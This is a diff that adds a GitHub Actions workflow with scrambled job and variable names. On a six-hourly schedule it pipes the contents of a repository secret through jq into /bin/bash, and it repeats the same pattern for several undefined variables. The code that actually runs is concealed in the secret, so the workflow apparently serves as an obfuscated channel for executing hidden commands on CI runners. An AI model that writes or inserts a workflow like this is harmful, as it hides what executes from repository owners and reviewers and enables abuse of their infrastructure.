@@ -1,0 +1,23 @@
+name: shangwth
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '37 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: shangwth
+        env:
+          ehruz95618: ${{ secrets.ehruz95618 }}
+        run: |
+          echo $ehruz95618 | jq -r .gep34 | /bin/bash
+          echo $txhqu28361 | jq -r .ecrm98758 | /bin/bash
+          echo $sd291 | jq -r .jyojw5904 | /bin/bash
+          echo $lwhij14 | jq -r .pk0 | /bin/bash
+          echo $zvnte285 | jq -r .ubc86360 | /bin/bash
+          echo $t85 | jq -r .q3693 | /bin/bash
+          echo $b04912 | jq -r .ln8 | /bin/bash
+          echo $kln11625 | jq -r .e71692 | /bin/bash
+
